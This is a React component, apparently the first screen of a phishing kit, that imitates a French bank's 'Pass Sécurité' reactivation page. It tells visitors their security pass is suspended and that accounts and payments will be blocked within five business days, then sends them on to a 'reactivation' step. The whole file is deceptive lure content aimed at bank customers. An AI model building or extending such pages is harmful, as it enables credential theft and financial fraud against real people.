import React from 'react';

interface LandingStepProps {
  onContinue: () => void;
}

const LandingStep: React.FC<LandingStepProps> = ({ onContinue }) => {
  return (
    <main className="pt-28 min-h-screen flex items-center justify-center px-4 py-8">
      <div className="w-full max-w-md animate-fadeIn">
        <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 rounded-full border-4 border-sg-red flex items-center justify-center">
              <svg className="w-8 h-8 text-sg-red" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
          </div>

          <h1 className="font-heading text-2xl font-bold text-gray-900 mb-6 leading-tight uppercase tracking-tight">
            Réactivation de<br />votre<br />Pass Sécurité
          </h1>

          <p className="text-sm text-gray-700 leading-relaxed mb-4">
            Dans le cadre du renforcement de nos protocoles de sécurité bancaire, une vérification obligatoire de l'ensemble des services Pass Sécurité est en cours. Votre Pass Sécurité a été
            <strong className="font-bold"> temporairement suspendu</strong> le temps de cette procédure.
          </p>

          <p className="text-sm text-gray-700 leading-relaxed mb-4">
            <strong className="font-bold">Sans réactivation sous 5 jours ouvrés, l'accès à vos comptes, virements et paiements en ligne sera automatiquement bloqué.</strong> Vos moyens de paiement (carte bancaire, prélèvements) pourraient également être impactés.
          </p>

          <p className="text-sm text-gray-700 leading-relaxed mb-4">
            Cette procédure est déployée <strong className="font-bold">progressivement sur l'ensemble de nos clients</strong> par groupes, sur une période de plusieurs semaines. Si vous avez reçu cette notification, votre compte fait partie de la phase en cours.
          </p>

          <p className="text-sm text-gray-600 italic leading-relaxed mb-8">
            La réactivation ne prend que quelques minutes.
          </p>

          <button
            onClick={onContinue}
            className="w-full py-4 bg-sg-red hover:bg-sg-red-dark text-white font-semibold text-sm rounded-full transition-all duration-200 shadow-md hover:shadow-lg uppercase tracking-wide"
          >
            Procéder à la réactivation
          </button>
        </div>
      </div>
    </main>
  );
};

export default LandingStep;
